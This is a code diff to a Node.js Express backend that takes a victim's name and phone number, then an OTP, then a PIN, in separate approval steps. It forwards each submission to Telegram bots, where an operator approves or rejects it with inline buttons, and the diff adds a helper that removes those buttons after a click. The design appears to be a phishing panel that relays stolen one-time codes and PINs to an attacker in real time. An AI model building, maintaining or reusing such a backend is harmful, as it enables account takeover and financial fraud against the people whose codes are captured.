@@ -8,10 +8,10 @@ const PORT = process.env.PORT || 10000;
 const DOMAIN = process.env.BACKEND_DOMAIN;
 
 // ---------- IN-MEMORY STORES ----------
-const phoneRequests = {};   // stores approval status for phone step
-const otpRequests = {};    // stores approval status for OTP step
-const pinRequests = {};    // stores approval status for PIN step
-const requestMeta = {};    // stores name, phone, botId for each request
+const phoneRequests = {};
+const otpRequests = {};
+const pinRequests = {};
+const requestMeta = {};
 
 // ---------- BOTS ----------
 const bots = [];
@@ -56,6 +56,23 @@ async function answerCallback(bot, id) {
   } catch {}
 }
 
+// ✅ Remove inline buttons from a message after a click
+async function removeButtons(bot, chatId, messageId) {
+  try {
+    await axios.post(`https://api.telegram.org/bot${bot.token}/editMessageReplyMarkup`, {
+      chat_id: chatId,
+      message_id: messageId,
+      reply_markup: { inline_keyboard: [] }
+    });
+  } catch (e) {
+    const desc = e.response?.data?.description || '';
+    // Ignore if already modified (double click) — buttons are gone anyway
+    if (!desc.includes('message is not modified')) {
+      console.error('❌ Remove buttons error:', e.response?.data || e.message);
+    }
+  }
+}
+
 // ---------- WEBHOOKS ----------
 async function setWebhook(bot) {
   if (!DOMAIN) return;
@@ -74,7 +91,7 @@ async function setAllWebhooks() {
   for (const bot of bots) await setWebhook(bot);
 }
 
-// ---------- PHONE STEP ----------ip'p'i'p'o
+// ---------- PHONE STEP ----------
 app.post('/submit-phone', (req, res) => {
   try {
     const { name, phone, botId } = req.body;
@@ -82,7 +99,7 @@ app.post('/submit-phone', (req, res) => {
     if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
     const requestId = uuidv4();
-    phoneRequests[requestId] = null;      // pending
+    phoneRequests[requestId] = null;
     requestMeta[requestId] = { name, phone, botId };
 
     sendTelegram(
@@ -194,6 +211,11 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
   const [action, requestId] = cb.data.split(':');
   const meta = requestMeta[requestId];
+
+  // ✅ Remove buttons immediately so they can't be clicked again
+  if (cb.message) {
+    await removeButtons(bot, cb.message.chat.id, cb.message.message_id);
+  }
 
   let feedback = '';
 
